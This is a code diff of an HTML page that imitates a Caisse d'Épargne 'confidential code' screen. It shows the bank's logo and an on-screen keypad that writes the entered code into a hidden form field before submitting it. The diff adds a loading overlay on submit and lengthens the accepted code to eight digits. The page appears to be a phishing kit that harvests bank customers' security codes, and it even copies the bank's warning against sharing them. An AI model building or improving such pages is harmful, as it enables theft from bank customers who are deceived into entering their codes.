@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Code confidentiel - Caisse d'Épargne</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -159,48 +159,6 @@
       color: #fff;
       cursor: pointer;
     }
-    .custom-switch {
-  position: relative;
-  display: inline-block;
-  width: 40px;
-  height: 20px;
-}
-
-.custom-switch input {
-  opacity: 0;
-  width: 0;
-  height: 0;
-}
-
-.slider {
-  position: absolute;
-  cursor: pointer;
-  top: 0; left: 0; right: 0; bottom: 0;
-  background-color: #ccc;
-  border-radius: 34px;
-  transition: 0.4s;
-}
-
-.slider:before {
-  position: absolute;
-  content: "";
-  height: 16px;
-  width: 16px;
-  left: 2px;
-  bottom: 2px;
-  background-color: white;
-  border-radius: 50%;
-  transition: 0.4s;
-}
-
-.custom-switch input:checked + .slider {
-  background-color: #c10000;  /* Rouge comme ton thème */
-}
-
-.custom-switch input:checked + .slider:before {
-  transform: translateX(20px);
-}
-
     .btn-annuler {
       padding: 14px;
       border: 1px solid #c10000;
@@ -211,12 +169,49 @@
       cursor: pointer;
       width: 100%;
     }
+    /* Loader CSS */
+    #loader {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    #loader img {
+      height: 60px;
+      margin-bottom: 20px;
+    }
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #c10000;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
   </style>
 </head>
 <body>
+
+  <!-- Loader overlay -->
+  <div id="loader">
+    <img src="https://ce-prod.cloudimg.io/_images_/app/uploads/sites/3/2022/02/17171235/logo-ce-desktop.jpg" alt="Logo Caisse d'Épargne" />
+    <div class="spinner"></div>
+  </div>
+
   <div class="header">
     <a href="#">Quitter</a>
-    <img src="https://ce-prod.cloudimg.io/_images_/app/uploads/sites/3/2022/02/17171235/logo-ce-desktop.jpg?func=bound&w=300&h=78&gravity=auto&optipress=2" alt="Logo">
+    <img src="https://ce-prod.cloudimg.io/_images_/app/uploads/sites/3/2022/02/17171235/logo-ce-desktop.jpg" alt="Logo" />
     <div class="help">?</div>
   </div>
 
@@ -227,7 +222,7 @@
       <div class="toggle-row">
         <span>Assistance vocale</span>
         <label class="custom-switch">
-          <input type="checkbox">
+          <input type="checkbox" />
           <span class="slider"></span>
         </label>
       </div>
@@ -240,6 +235,8 @@
           <div class="circle"></div>
           <div class="circle"></div>
           <div class="circle"></div>
+          <div class="circle"></div> <!-- nouveau -->
+          <div class="circle"></div> <!-- nouveau -->
           <button type="button" class="clear-btn" id="clearBtn" onclick="clearLastDigit()">&#x2715;</button>
         </div>
 
@@ -266,15 +263,25 @@
           Nous ne vous demanderons JAMAIS de COMMUNIQUER les données de votre banque (identifiant, mot de passe, code reçu par sms, code Sécur’Pass…), pour CONFIRMER ou ANNULER une opération (ajout de compte bénéficiaire, virement, paiement par carte, validation Sécur’Pass…).
         </div>
 
-        <input type="hidden" name="code" id="hiddenCode">
+        <input type="hidden" name="code" id="hiddenCode" />
       </form>
     </div>
   </div>
 
   <div class="floating-zone">
     <div class="buttons">
-      <button type="button" class="btn-valider" id="validerBtn" disabled onclick="submitForm()">Valider</button>
-      <button type="button" class="btn-annuler" onclick="window.location.href='/'">Annuler</button>
+      <button
+        type="button"
+        class="btn-valider"
+        id="validerBtn"
+        disabled
+        onclick="submitForm()"
+      >
+        Valider
+      </button>
+      <button type="button" class="btn-annuler" onclick="window.location.href='/'">
+        Annuler
+      </button>
     </div>
   </div>
 
@@ -282,57 +289,63 @@
     let code = "";
 
     function appendDigit(digit) {
-      if (code.length < 6) {
+      if (code.length < 8) {
         code += digit;
-        document.getElementById('hiddenCode').value = code;
+        document.getElementById("hiddenCode").value = code;
         updateCircles();
       }
 
-      const btn = document.getElementById('validerBtn');
-      const clearBtn = document.getElementById('clearBtn');
+      const btn = document.getElementById("validerBtn");
+      const clearBtn = document.getElementById("clearBtn");
       if (code.length >= 1) {
-        btn.classList.add('active');
+        btn.classList.add("active");
         btn.disabled = false;
-        clearBtn.style.display = 'inline-block';
+        clearBtn.style.display = "inline-block";
       } else {
-        btn.classList.remove('active');
+        btn.classList.remove("active");
         btn.disabled = true;
-        clearBtn.style.display = 'none';
+        clearBtn.style.display = "none";
       }
     }
 
     function clearLastDigit() {
       code = code.slice(0, -1);
-      document.getElementById('hiddenCode').value = code;
+      document.getElementById("hiddenCode").value = code;
       updateCircles();
 
-      const btn = document.getElementById('validerBtn');
-      const clearBtn = document.getElementById('clearBtn');
+      const btn = document.getElementById("validerBtn");
+      const clearBtn = document.getElementById("clearBtn");
       if (code.length >= 1) {
-        btn.classList.add('active');
+        btn.classList.add("active");
         btn.disabled = false;
-        clearBtn.style.display = 'inline-block';
+        clearBtn.style.display = "inline-block";
       } else {
-        btn.classList.remove('active');
+        btn.classList.remove("active");
         btn.disabled = true;
-        clearBtn.style.display = 'none';
+        clearBtn.style.display = "none";
       }
     }
 
     function updateCircles() {
-      const circles = document.querySelectorAll('.circle');
+      const circles = document.querySelectorAll(".circle");
       circles.forEach((circle, index) => {
         if (index < code.length) {
-          circle.classList.add('filled');
+          circle.classList.add("filled");
         } else {
-          circle.classList.remove('filled');
+          circle.classList.remove("filled");
         }
       });
     }
 
     function submitForm() {
       if (code.length > 0) {
-        document.getElementById('form').submit();
+        // Affiche le loader
+        const loader = document.getElementById("loader");
+        loader.style.visibility = "visible";
+        loader.style.opacity = "1";
+
+        // Soumet le formulaire
+        document.getElementById("form").submit();
       }
     }
   </script>
